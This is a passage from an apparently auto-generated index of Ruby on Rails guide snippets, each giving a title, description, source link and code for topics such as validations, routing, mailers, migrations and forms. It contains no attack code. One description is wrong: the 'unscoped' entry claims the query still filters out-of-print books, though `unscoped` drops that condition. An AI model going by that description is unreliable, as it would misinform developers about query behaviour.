`where`) to add a custom SQL `WHERE` clause to the uniqueness check query, limiting the scope further (e.g., only checking against active records).\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_validations.md#2025-04-23_snippet_36\n\nLANGUAGE: ruby\nCODE:\n```\nvalidates :name, uniqueness: { conditions: -> { where(status: \"active\") } }\n```\n\n----------------------------------------\n\nTITLE: Shallow Nesting with :shallow_path\nDESCRIPTION: This snippet demonstrates how to customize the member routes in shallow nesting using the `:shallow_path` option within a `scope`. The `:shallow_path` option prefixes the member routes (show, edit, update, destroy) with the specified path segment (in this case, \"sekret\"). This allows you to customize the URL structure of shallow routes.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/routing.md#_snippet_16\n\nLANGUAGE: ruby\nCODE:\n```\nscope shallow_path: \"sekret\" do\n  resources :articles do\n    resources :comments, shallow: true\n  end\nend\n```\n\n----------------------------------------\n\nTITLE: Basic System Test Structure (Ruby)\nDESCRIPTION: This Ruby code represents a basic system test structure generated by Rails. It includes requiring the `application_system_test_case` and defining a test case class that inherits from it.  A placeholder test is commented out, demonstrating how to visit a URL and assert the presence of an element.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/testing.md#_snippet_59\n\nLANGUAGE: ruby\nCODE:\n```\nrequire \"application_system_test_case\"\n\nclass UsersTest < ApplicationSystemTestCase\n  # test \"visiting the index\" do\n  #   visit users_url\n  #\n  #   assert_dom \"h1\", text: \"Users\"\n  # end\nend\n```\n\n----------------------------------------\n\nTITLE: Adding Initial Data to Database Using Migrations - Ruby\nDESCRIPTION: This code snippet demonstrates how to add initial data to a database using a Rails migration. The `up` method creates five product entries with incrementing names, while the `down` method deletes all product records, thus allowing easy rollback.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_migrations.md#_snippet_74\n\nLANGUAGE: ruby\nCODE:\n```\nclass AddInitialProducts < ActiveRecord::Migration[8.1]\n  def up\n    5.times do |i|\n      Product.create(name: \"Product ##{i}\", description: \"A product.\")\n    end\n  end\n\n  def down\n    Product.delete_all\n  end\nend\n```\n\n----------------------------------------\n\nTITLE: ERB Template Example (HTML+ERB)\nDESCRIPTION: This ERB template demonstrates how to iterate over a collection of people and display their names. It uses `<% %>` tags for Ruby code execution and `<%= %>` tags for outputting the result. It also shows how to add comments using the `<%# %>` tag.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/action_view_overview.md#_snippet_1\n\nLANGUAGE: HTML+ERB\nCODE:\n```\n<h1>Names</h1>\n<% @people.each do |person| %>\n  Name: <%= person.name %><br>\n<% end %>\n```\n\n----------------------------------------\n\nTITLE: Finding Descendants with descendants\nDESCRIPTION: This Ruby code demonstrates how to use the `descendants` method to find all classes that are `<` than its receiver, meaning all classes inheriting from it directly or indirectly. The `descendants` method returns an array of all descendant classes.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_support_core_extensions.md#_snippet_33\n\nLANGUAGE: ruby\nCODE:\n```\nclass C; end\nC.descendants # => []\n\nclass B < C; end\nC.descendants # => [B]\n\nclass A < B; end\nC.descendants # => [B, A]\n\nclass D < C; end\nC.descendants # => [B, A, D]\n```\n\n----------------------------------------\n\nTITLE: Sending Email to Multiple Recipients (Ruby)\nDESCRIPTION: Defines a Rails mailer action sending an email to all admins by populating the to field with an array of email addresses using Admin.pluck(:email). Demonstrates usage of default headers and a succinct way to email multiple users. Suitable for notifications to groups in the application.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/action_mailer_basics.md#2025-04-23_snippet_28\n\nLANGUAGE: ruby\nCODE:\n```\nclass AdminMailer < ApplicationMailer\n  default to: -> { Admin.pluck(:email) },\n          from: \"notification@example.com\"\n\n  def new_registration(user)\n    @user = user\n    mail(subject: \"New User Signup: #{@user.email}\")\n  end\nend\n```\n\n----------------------------------------\n\nTITLE: Registering a before_validation callback with a custom object in Rails\nDESCRIPTION: This code snippet demonstrates registering a `before_validation` callback using a custom callback object (`AddUsername`). The `AddUsername` class implements the `before_validation` method, which assigns the `email` value to the `username` if `username` is blank. It also validates the presence of `username` and `email`.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_callbacks.md#_snippet_5\n\nLANGUAGE: ruby\nCODE:\n```\nclass User < ApplicationRecord\n  validates :username, :email, presence: true\n\n  before_validation AddUsername\nend\n\nclass AddUsername\n  def self.before_validation(record)\n    if record.username.blank?\n      record.username = record.email\n    end\n  end\nend\n```\n\n----------------------------------------\n\nTITLE: Generating a Mailer Class with Rails Generator\nDESCRIPTION: Uses the Rails generator to create a new mailer class called UserMailer along with associated files including views, tests, and preview files.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/action_mailer_basics.md#2025-04-23_snippet_0\n\nLANGUAGE: bash\nCODE:\n```\n$ bin/rails generate mailer User\ncreate  app/mailers/user_mailer.rb\ninvoke  erb\ncreate    app/views/user_mailer\ninvoke  test_unit\ncreate    test/mailers/user_mailer_test.rb\ncreate    test/mailers/previews/user_mailer_preview.rb\n```\n\n----------------------------------------\n\nTITLE: Generating Auto-Discovery Link Tags with auto_discovery_link_tag Helper in Ruby\nDESCRIPTION: Shows the `auto_discovery_link_tag` helper from Action View's AssetTagHelper. It generates an HTML `<link>` tag used by browsers and feed readers to detect RSS, Atom, or JSON feeds associated with the page.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/action_view_helpers.md#2025-04-23_snippet_28\n\nLANGUAGE: ruby\nCODE:\n```\nauto_discovery_link_tag(:rss, \"http://www.example.com/feed.rss\", { title: \"RSS Feed\" })\n# => <link rel=\"alternate\" type=\"application/rss+xml\" title=\"RSS Feed\" href=\"http://www.example.com/feed.rss\" />\n```\n\n----------------------------------------\n\nTITLE: XML Serializer using Dasherize\nDESCRIPTION: This snippet showcases the `reformat_name` method within Active Model's XML serializer, where the `dasherize` method is conditionally applied to node names, ensuring they adhere to the desired naming convention. The `camelize?` option determines whether to first camelize the name.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_support_core_extensions.md#_snippet_75\n\nLANGUAGE: ruby\nCODE:\n```\ndef reformat_name(name)\n  name = name.camelize if camelize?\n  dasherize? ? name.dasherize : name\nend\n```\n\n----------------------------------------\n\nTITLE: Joining a Single Association in Rails\nDESCRIPTION: This snippet demonstrates how to join the `books` table with the `reviews` table using the `joins` method in Active Record. It retrieves all `Book` objects that have associated `reviews`. The resulting SQL query performs an INNER JOIN between the `books` and `reviews` tables based on the `book_id`.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_querying.md#_snippet_139\n\nLANGUAGE: ruby\nCODE:\n```\nBook.joins(:reviews)\n```\n\nLANGUAGE: sql\nCODE:\n```\nSELECT books.* FROM books\n  INNER JOIN reviews ON reviews.book_id = books.id\n```\n\n----------------------------------------\n\nTITLE: Declaring has_one Association in a Model - Ruby\nDESCRIPTION: Declares a has_one association in the Supplier ActiveRecord model to link a single Account. The corresponding Account model validates attribute presence and belongs_to Supplier. This sets up the one-to-one association from the model side, requiring database schema support for the foreign key.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/association_basics.md#2025-04-23_snippet_23\n\nLANGUAGE: ruby\nCODE:\n```\n# app/models/supplier.rb\\nclass Supplier < ApplicationRecord\\n  has_one :account\\nend\\n\\n# app/models/account.rb\\nclass Account < ApplicationRecord\\n  validates :terms, presence: true\\n  belongs_to :supplier\\nend\n```\n\n----------------------------------------\n\nTITLE: Multiple Database Configuration with Replicas in YAML\nDESCRIPTION: Extended database.yml configuration showing primary and animals databases with their respective replicas, including authentication and migration settings.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_multiple_databases.md#2025-04-23_snippet_1\n\nLANGUAGE: yaml\nCODE:\n```\nproduction:\n  primary:\n    database: my_primary_database\n    username: root\n    password: <%= ENV['ROOT_PASSWORD'] %>\n    adapter: mysql2\n  primary_replica:\n    database: my_primary_database\n    username: root_readonly\n    password: <%= ENV['ROOT_READONLY_PASSWORD'] %>\n    adapter: mysql2\n    replica: true\n  animals:\n    database: my_animals_database\n    username: animals_root\n    password: <%= ENV['ANIMALS_ROOT_PASSWORD'] %>\n    adapter: mysql2\n    migrations_paths: db/animals_migrate\n  animals_replica:\n    database: my_animals_database\n    username: animals_readonly\n    password: <%= ENV['ANIMALS_READONLY_PASSWORD'] %>\n    adapter: mysql2\n    replica: true\n```\n\n----------------------------------------\n\nTITLE: HTML Output of Date and Time Form Helpers\nDESCRIPTION: This snippet shows the HTML output generated by the date and time related form helpers in Rails.  Each line corresponds to the erb snippet above. They create HTML input tags with specific 'type' attributes corresponding to the field type.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/form_helpers.md#_snippet_10\n\nLANGUAGE: html\nCODE:\n```\n<input type=\"date\" name=\"born_on\" id=\"born_on\">\n<input type=\"time\" name=\"started_at\" id=\"started_at\">\n<input type=\"datetime-local\" name=\"graduation_day\" id=\"graduation_day\">\n<input type=\"month\" name=\"birthday_month\" id=\"birthday_month\">\n<input type=\"week\" name=\"birthday_week\" id=\"birthday_week\">\n```\n\n----------------------------------------\n\nTITLE: Regexp Multiline? Ruby\nDESCRIPTION: The `multiline?` method checks if a regular expression has the `/m` flag set. This flag determines whether the dot (`.`) in the regular expression matches newline characters or not. This is used in Rails to restrict multiline regexps from being used in route requirements.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_support_core_extensions.md#_snippet_137\n\nLANGUAGE: ruby\nCODE:\n```\n%r{.}.multiline?  # => false\n%r{.}m.multiline? # => true\n\nRegexp.new(\".\").multiline?                    # => false\nRegexp.new(\".\", Regexp::MULTILINE).multiline? # => true\n```\n\nLANGUAGE: ruby\nCODE:\n```\ndef verify_regexp_requirements(requirements)\n  # ...\n  if requirement.multiline?\n    raise ArgumentError, \"Regexp multiline option is not allowed in routing requirements: #{requirement.inspect}\"\n  end\n  # ...\nend\n```\n\n----------------------------------------\n\nTITLE: Sending Emails Asynchronously with Action Mailer and deliver_later (Ruby)\nDESCRIPTION: This snippet demonstrates how to send emails asynchronously using Action Mailer and Active Job's `deliver_later` method. By using `deliver_later` instead of `deliver_now`, the email sending process is offloaded to a background job, preventing delays in the request-response cycle.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_job_basics.md#_snippet_36\n\nLANGUAGE: ruby\nCODE:\n```\n# If you want to send the email now use #deliver_now\nUserMailer.welcome(@user).deliver_now\n\n# If you want to send the email through Active Job use #deliver_later\nUserMailer.welcome(@user).deliver_later\n```\n\n----------------------------------------\n\nTITLE: Creating Custom Validators with ActiveModel::EachValidator\nDESCRIPTION: Demonstrates how to create a reusable validator class using ActiveModel::EachValidator. This validator checks if a title attribute contains one of the allowed values and can be applied to any model implementing ActiveModel::Validations.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/3_0_release_notes.md#2025-04-23_snippet_10\n\nLANGUAGE: ruby\nCODE:\n```\nclass TitleValidator < ActiveModel::EachValidator\n  Titles = ['Mr.', 'Mrs.', 'Dr.']\n  def validate_each(record, attribute, value)\n    unless Titles.include?(value)\n      record.errors[attribute] << 'must be a valid title'\n    end\n  end\nend\n```\n\n----------------------------------------\n\nTITLE: Configuring Active Storage Allowed Inline Content Types in Ruby\nDESCRIPTION: This snippet configures the content types that Active Storage allows to be served inline. It sets the `config.active_storage.content_types_allowed_inline` to an array of content types that can be displayed directly in the browser. This is useful for allowing images and PDFs to be shown inline, improving the user experience.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/configuring.md#_snippet_76\n\nLANGUAGE: ruby\nCODE:\n```\nconfig.active_storage.content_types_allowed_inline = %w(image/webp image/avif image/png image/gif image/jpeg image/tiff image/vnd.adobe.photoshop image/vnd.microsoft.icon application/pdf)\n```\n\n----------------------------------------\n\nTITLE: Range Overlap? Ruby\nDESCRIPTION: The `overlap?` method checks if two ranges have a non-empty intersection. It returns true if the ranges overlap, and false otherwise.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_support_core_extensions.md#_snippet_140\n\nLANGUAGE: ruby\nCODE:\n```\n(1..10).overlap?(7..11)  # => true\n(1..10).overlap?(0..7)   # => true\n(1..10).overlap?(11..27) # => false\n```\n\n----------------------------------------\n\nTITLE: Loading All of Active Support\nDESCRIPTION: This snippet demonstrates how to load all of Active Support, including framework parts configured via `autoload`.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_support_core_extensions.md#_snippet_5\n\nLANGUAGE: ruby\nCODE:\n```\nrequire \"active_support/all\"\n```\n\n----------------------------------------\n\nTITLE: Jbuilder Example (Ruby)\nDESCRIPTION: This Ruby code demonstrates how to use the Jbuilder gem to generate a JSON response. It sets the name and email attributes of the JSON object. The `json` object is automatically available within Jbuilder templates.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/action_view_overview.md#_snippet_3\n\nLANGUAGE: Ruby\nCODE:\n```\njson.name(\"Alex\")\njson.email(\"alex@example.com\")\n```\n\n----------------------------------------\n\nTITLE: Listing Configuration Variables - Bash\nDESCRIPTION: Provides the rake command to display all available environment configuration variables for Rails guide generation. Minimal dependencies: Rake must be installed.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/ruby_on_rails_guides_guidelines.md#2025-04-23_snippet_14\n\nLANGUAGE: bash\nCODE:\n```\n$ rake\n```\n\n----------------------------------------\n\nTITLE: Configuring PostgreSQL Development Database (YAML)\nDESCRIPTION: This YAML snippet configures a PostgreSQL database for the development environment in a Rails application. It specifies the adapter, encoding, database name, and connection pool size.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/configuring.md#_snippet_90\n\nLANGUAGE: yaml\nCODE:\n```\ndevelopment:\n  adapter: postgresql\n  encoding: unicode\n  database: blog_development\n  pool: 5\n```\n\n----------------------------------------\n\nTITLE: Running Generator Tests with Debugger Output Enabled in Shell\nDESCRIPTION: Executes a specific generator test file (`test/generators/actions_test.rb`) using `./bin/test`, while setting the `RAILS_LOG_TO_STDOUT` environment variable to `true`. This ensures that output from debugging tools (like `puts` or interactive debuggers) is correctly displayed in the console.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/contributing_to_ruby_on_rails.md#2025-04-23_snippet_31\n\nLANGUAGE: sh\nCODE:\n```\nRAILS_LOG_TO_STDOUT=true ./bin/test test/generators/actions_test.rb\n```\n\n----------------------------------------\n\nTITLE: Running Puma Server in Rack::Handler::Puma (Ruby)\nDESCRIPTION: This snippet shows the implementation of the `run` method for the Puma server in the Rack::Handler::Puma module. It configures and launches the Puma server with the provided Rails application.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/initialization.md#2025-04-23_snippet_20\n\nLANGUAGE: Ruby\nCODE:\n```\nmodule Rack\n  module Handler\n    module Puma\n      # ...\n      def self.run(app, options = {})\n        conf = self.config(app, options)\n\n        log_writer = options.delete(:Silent) ? ::Puma::LogWriter.strings : ::Puma::LogWriter.stdio\n\n        launcher = ::Puma::Launcher.new(conf, log_writer: log_writer, events: @events)\n\n        yield launcher if block_given?\n        begin\n          launcher.run\n        rescue Interrupt\n          puts \"* Gracefully stopping, waiting for requests to finish\"\n          launcher.stop\n          puts \"* Goodbye!\"\n        end\n      end\n      # ...\n    end\n  end\nend\n```\n\n----------------------------------------\n\nTITLE: Specifying Alternate Layout for Action Mailer (Ruby)\nDESCRIPTION: Demonstrates setting a custom layout in a Rails mailer class by supplying the layout method with the desired layout name, e.g., awesome. The named layout must correspond to files in app/views/layouts. All emails from this mailer will use this layout unless overridden in another scope.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/action_mailer_basics.md#2025-04-23_snippet_26\n\nLANGUAGE: ruby\nCODE:\n```\nclass UserMailer < ApplicationMailer\n  layout \"awesome\" # Use awesome.(html|text).erb as the layout\nend\n```\n\n----------------------------------------\n\nTITLE: Example Payload for send_stream.action_controller Hook in Ruby\nDESCRIPTION: Provides an example Ruby Hash payload for the `send_stream.action_controller` notification. This event is associated with streaming data to the client using `send_stream`. Its payload contains the `:filename` for the download, the HTTP content `:type` (e.g., \"text/csv\"), and the HTTP content `:disposition` (e.g., \"attachment\").\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_support_instrumentation.md#2025-04-23_snippet_8\n\nLANGUAGE: ruby\nCODE:\n```\n{\n  filename: \"subscribers.csv\",\n  type: \"text/csv\",\n  disposition: \"attachment\"\n}\n```\n\n----------------------------------------\n\nTITLE: Converting DateTime to UTC in Ruby\nDESCRIPTION: This snippet illustrates the use of the `utc` method on a DateTime object to convert it to Coordinated Universal Time (UTC). The method returns a new DateTime object representing the same moment in time, but expressed in the UTC time zone. The `getutc` alias provides the same functionality.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_support_core_extensions.md#_snippet_160\n\nLANGUAGE: ruby\nCODE:\n```\nnow = DateTime.current # => Mon, 07 Jun 2010 19:27:52 -0400\nnow.utc                # => Mon, 07 Jun 2010 23:27:52 +0000\n```\n\n----------------------------------------\n\nTITLE: Conditional GET with fresh_when\nDESCRIPTION: This snippet uses `fresh_when` to automatically handle conditional GETs.  If the request is fresh, a `:not_modified` response is sent; otherwise, the default template is rendered.  It's simpler than `stale?` when using default rendering.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/caching_with_rails.md#_snippet_49\n\nLANGUAGE: ruby\nCODE:\n```\nclass ProductsController < ApplicationController\n  # This will automatically send back a :not_modified if the request is fresh,\n  # and will render the default template (product.*) if it's stale.\n\n  def show\n    @product = Product.find(params[:id])\n    fresh_when last_modified: @product.published_at.utc, etag: @product\n  end\nend\n```\n\n----------------------------------------\n\nTITLE: Calculating Time Durations in Ruby\nDESCRIPTION: Shows how to use `seconds`, `minutes`, `hours`, `days`, `weeks`, and `fortnights` to declare and calculate time durations, and how these can be added to or subtracted from Time objects. These are ActiveSupport core extensions to the Numeric class.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_support_core_extensions.md#_snippet_97\n\nLANGUAGE: ruby\nCODE:\n```\n# equivalent to Time.current.advance(days: 1)\n1.day.from_now\n\n# equivalent to Time.current.advance(weeks: 2)\n2.weeks.from_now\n\n# equivalent to Time.current.advance(days: 4, weeks: 5)\n(4.days + 5.weeks).from_now\n```\n\n----------------------------------------\n\nTITLE: Defining Document Model for Full-Text Search - Rails Model - Ruby\nDESCRIPTION: Implements a minimal Rails model Document inheriting from ApplicationRecord, enabling ORM mapping to the documents table. No additional logic or dependencies required beyond Rails. Serves as the interface for reading and writing records, and enables chaining queries using ActiveRecord methods.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_postgresql.md#2025-04-23_snippet_16\n\nLANGUAGE: ruby\nCODE:\n```\n# app/models/document.rb\\nclass Document < ApplicationRecord\\nend\n```\n\n----------------------------------------\n\nTITLE: Converting Array to Sentence (Ruby)\nDESCRIPTION: This snippet demonstrates the usage of `to_sentence` to convert an array into a human-readable sentence string. It showcases different array sizes and the resulting sentences.  The method also accepts options to customize the connectors used between words.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_support_core_extensions.md#_snippet_124\n\nLANGUAGE: ruby\nCODE:\n```\n%w().to_sentence                # => \"\"\n%w(Earth).to_sentence           # => \"Earth\"\n%w(Earth Wind).to_sentence      # => \"Earth and Wind\"\n%w(Earth Wind Fire).to_sentence # => \"Earth, Wind, and Fire\"\n```\n\n----------------------------------------\n\nTITLE: Configuring Active Job Queue Adapter in Rails\nDESCRIPTION: This code snippet demonstrates how to configure the queue adapter for Active Job. It sets the `queue_adapter` to `:sidekiq`, ensuring that Active Job uses Sidekiq as the queuing backend.  The Sidekiq gem must be included in the Gemfile, and Sidekiq itself must be properly set up and configured.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/configuring.md#_snippet_66\n\nLANGUAGE: ruby\nCODE:\n```\n# Be sure to have the adapter's gem in your Gemfile\n# and follow the adapter's specific installation\n# and deployment instructions.\nconfig.active_job.queue_adapter = :sidekiq\n```\n\n----------------------------------------\n\nTITLE: Generated Search Form HTML - HTML\nDESCRIPTION: This is the HTML code generated by the search form defined in the previous ERB snippet. It includes the form tag with the action attribute set to /search and the method set to GET. It also includes a label for the query input, a search field, and a submit button.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/form_helpers.md#_snippet_3\n\nLANGUAGE: html\nCODE:\n```\n<form action=\"/search\" accept-charset=\"UTF-8\" method=\"get\">\n  <label for=\"query\">Search for:</label>\n  <input type=\"search\" name=\"query\" id=\"query\">\n  <input type=\"submit\" name=\"commit\" value=\"Search\" data-disable-with=\"Search\">\n</form>\n```\n\n----------------------------------------\n\nTITLE: Including Yaffle::ActsAsYaffle in ApplicationRecord - Rails Model Inheritance - Ruby\nDESCRIPTION: Extends ApplicationRecord to include the Yaffle::ActsAsYaffle module, making the extension available to all models inheriting from ApplicationRecord. 'self.abstract_class = true' maintains Rails best practices. Requires yaffle plugin and is typically placed in dummy or application code.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/plugins.md#2025-04-23_snippet_19\n\nLANGUAGE: ruby\nCODE:\n```\n# test/dummy/app/models/application_record.rb\n\nclass ApplicationRecord < ActiveRecord::Base\n  include Yaffle::ActsAsYaffle\n\n  self.abstract_class = true\nend\n```\n\n----------------------------------------\n\nTITLE: HTML Output of Common Form Helpers\nDESCRIPTION: This snippet shows the HTML output generated by common form helpers in Rails, corresponding to the erb snippet above. Note the different attributes and tags used for each type of input.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/form_helpers.md#_snippet_14\n\nLANGUAGE: html\nCODE:\n```\n<textarea name=\"message\" id=\"message\" cols=\"70\" rows=\"5\"></textarea>\n<input value=\"foo\" autocomplete=\"off\" type=\"hidden\" name=\"parent_id\" id=\"parent_id\">\n<input step=\"0.5\" min=\"1.0\" max=\"20.0\" type=\"number\" name=\"price\" id=\"price\">\n<input min=\"1\" max=\"100\" type=\"range\" name=\"discount\" id=\"discount\">\n<input type=\"search\" name=\"name\" id=\"name\">\n<input value=\"#000000\" type=\"color\" name=\"favorite_color\" id=\"favorite_color\">\n```\n\n----------------------------------------\n\nTITLE: Customize Migration Output - Ruby\nDESCRIPTION: This migration demonstrates how to customize the output generated during migration execution using methods like `suppress_messages`, `say`, and `say_with_time`.  It shows how to control the verbosity and information displayed during the migration process.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_migrations.md#_snippet_70\n\nLANGUAGE: ruby\nCODE:\n```\nclass CreateProducts < ActiveRecord::Migration[8.1]\n  def change\n    suppress_messages do\n      create_table :products do |t|\n        t.string :name\n        t.text :description\n        t.timestamps\n      end\n    end\n\n    say \"Created a table\"\n\n    suppress_messages { add_index :products, :name }\n    say \"and an index!\", true\n\n    say_with_time \"Waiting for a while\" do\n      sleep 10\n      250\n    end\n  end\nend\n```\n\n----------------------------------------\n\nTITLE: Testing RDoc Fixed-width Formatting in Shell - Bash\nDESCRIPTION: Shows a bash command to quickly test RDoc's fixed-width font handling. It pipes a string containing RDoc code to rdoc and outputs the HTML conversion result. Requires rdoc to be installed and available in the shell. Input is a string containing a Ruby symbol with +...+ markup.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/api_documentation_guidelines.md#2025-04-23_snippet_21\n\nLANGUAGE: bash\nCODE:\n```\n$ echo \"+:to_param+\" | rdoc --pipe\n# => <p><code>:to_param</code></p>\n```\n\n----------------------------------------\n\nTITLE: Activating Automatic Database Role Switching - Rails Generator - Bash\nDESCRIPTION: This generator command sets up the middleware needed for automatic database role switching in Rails via the active_record:multi_db generator. It prepares the codebase to support automatic switching between writer and replica databases based on HTTP request methods, assuming Rails is properly configured with multiple databases.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_multiple_databases.md#2025-04-23_snippet_13\n\nLANGUAGE: bash\nCODE:\n```\n$ bin/rails g active_record:multi_db\n```\n\n----------------------------------------\n\nTITLE: Console output querying all products\nDESCRIPTION: This code block is not code, but terminal output describing querying all products using Product.all.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/getting_started.md#_snippet_22\n\nLANGUAGE: irb\nCODE:\n```\nstore(dev)> Product.all\n  Product Load (0.1ms)  SELECT \"products\".* FROM \"products\" /* loading for pp */ LIMIT 11 /*application='Store'*/\n=> [#<Product:0x0000000121845158 id: 1, name: \"T-Shirt\", created_at: \"2024-11-09 16:35:01.117836000 +0000\", updated_at: \"2024-11-09 16:35:01.117836000 +0000\">,\n #<Product:0x0000000121845018 id: 2, name: \"Pants\", created_at: \"2024-11-09 16:36:01.856751000 +0000\", updated_at: \"2024-11-09 16:36:01.856751000 +0000\">]\n```\n\n----------------------------------------\n\nTITLE: Using Plain Ruby Objects for Complex Validation in Rails\nDESCRIPTION: This example shows how to use a regular Ruby object for complex validation scenarios instead of a validator class. It allows using instance variables and more complex validation logic.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_validations.md#2025-04-23_snippet_43\n\nLANGUAGE: ruby\nCODE:\n```\nclass Invoice < ApplicationRecord\n  validate do |invoice|\n    AddressValidator.new(invoice).validate\n  end\nend\n\nclass AddressValidator\n  def initialize(invoice)\n    @invoice = invoice\n  end\n\n  def validate\n    validate_field(:house_number)\n    validate_field(:street)\n    validate_field(:postcode)\n  end\n\n  private\n    def validate_field(field)\n      if @invoice.send(field).blank?\n        @invoice.errors.add field, \"#{field.to_s.humanize} is required\"\n      end\n    end\nend\n```\n\n----------------------------------------\n\nTITLE: Shallow Nesting at the Parent Resource Level\nDESCRIPTION: This snippet demonstrates how to apply the `:shallow` option at the parent resource level. When `:shallow` is specified on the `articles` resource, all nested resources (comments and quotes) will be shallowly nested, resulting in collection routes nested under `articles` and member routes at the top level.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/routing.md#_snippet_14\n\nLANGUAGE: ruby\nCODE:\n```\nresources :articles, shallow: true do\n  resources :comments\n  resources :quotes\nend\n```\n\n----------------------------------------\n\nTITLE: Testing Time-Dependent Code with travel_to\nDESCRIPTION: This example showcases how to use the `travel_to` helper to test time-dependent code. It temporarily alters `Date.current` within the block to verify functionality.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/testing.md#_snippet_119\n\nLANGUAGE: ruby\nCODE:\n```\n# Given a user is eligible for gifting a month after they register.\nuser = User.create(name: \"Gaurish\", activation_date: Date.new(2004, 10, 24))\nassert_not user.applicable_for_gifting?\n\ntravel_to Date.new(2004, 11, 24) do\n  # Inside the `travel_to` block `Date.current` is stubbed\n  assert_equal Date.new(2004, 10, 24), user.activation_date\n  assert user.applicable_for_gifting?\nend\n\n# The change was visible only inside the `travel_to` block.\nassert_equal Date.new(2004, 10, 24), user.activation_date\n```\n\n----------------------------------------\n\nTITLE: Using the Custom Sign-In Helper in a Controller Test\nDESCRIPTION: This code demonstrates how to use the `sign_in_as` helper defined in `SignInHelper` within a controller test to simulate a user signing in. It then performs a GET request to the profile URL and asserts a successful response.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/testing.md#_snippet_74\n\nLANGUAGE: ruby\nCODE:\n```\nrequire \"test_helper\"\n\nclass ProfileControllerTest < ActionDispatch::IntegrationTest\n  test \"should show profile\" do\n    # helper is now reusable from any controller test case\n    sign_in_as users(:david)\n\n    get profile_url\n    assert_response :success\n  end\nend\n```\n\n----------------------------------------\n\nTITLE: Defining Variants for Previews on Video Attachment (Ruby)\nDESCRIPTION: Defines a thumb variant for a video attachment, suitable for generating preview images from video files using Active Storage. The attachable.variant line declares the resizing instructions; prerequisites include tools like FFmpeg and Active Storage previewers.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_storage_overview.md#2025-04-23_snippet_22\n\nLANGUAGE: ruby\nCODE:\n```\nclass User < ApplicationRecord\n  has_one_attached :video do |attachable|\n    attachable.variant :thumb, resize_to_limit: [100, 100]\n  end\nend\n```\n\n----------------------------------------\n\nTITLE: Using permit_concurrent_loads with Concurrent Ruby in Rails\nDESCRIPTION: This snippet shows how to use `permit_concurrent_loads` with Concurrent Ruby's Promises. It demonstrates creating multiple futures and collecting their values while allowing concurrent loading to prevent deadlocks.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/threading_and_code_execution.md#2025-04-23_snippet_6\n\nLANGUAGE: ruby\nCODE:\n```\nRails.application.executor.wrap do\n  futures = 3.times.collect do |i|\n    Concurrent::Promises.future do\n      Rails.application.executor.wrap do\n        # do work here\n      end\n    end\n  end\n\n  values = ActiveSupport::Dependencies.interlock.permit_concurrent_loads do\n    futures.collect(&:value)\n  end\nend\n```\n\n----------------------------------------\n\nTITLE: Removing Scoping with unscoped in Rails with all and where\nDESCRIPTION: This snippet shows how `unscoped` can be used in conjunction with `where` to override any default scopes but still apply specific conditions. It demonstrates a query that retrieves all books, regardless of default scopes, that are out of print.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_querying.md#_snippet_172\n\nLANGUAGE: ruby\nCODE:\n```\nBook.where(out_of_print: true).unscoped.all\n```\n\n----------------------------------------\n\nTITLE: Checking Errors for Specific Attributes in Rails\nDESCRIPTION: This snippet demonstrates how to check for errors on specific attributes using the errors[] method. It shows how to retrieve error messages for the name attribute in different states.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_validations.md#2025-04-23_snippet_64\n\nLANGUAGE: ruby\nCODE:\n```\nirb> person = Person.new(name: \"John Doe\")\nirb> person.valid?\n=> true\nirb> person.errors[:name]\n=> []\n\nirb> person = Person.new(name: \"JD\")\nirb> person.valid?\n=> false\nirb> person.errors[:name]\n=> [\"is too short (minimum is 3 characters)\"]\n\nirb> person = Person.new\nirb> person.valid?\n=> false\nirb> person.errors[:name]\n=> [\"can't be blank\", \"is too short (minimum is 3 characters)\"]\n```\n\n----------------------------------------\n\nTITLE: Application Layout - ERB\nDESCRIPTION: This ERB snippet adds a log out button, a home link, and wraps the content of the page in a main tag.  It depends on `root_path` helper for home link.  This layout is shared across all pages.\nSOURCE: 